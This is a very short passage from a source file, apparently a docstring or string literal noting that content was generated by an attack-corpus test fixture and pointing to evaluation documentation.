    "Generated by tests/fixtures/attack_corpus (skills.py); see docs/evaluation.md."
)
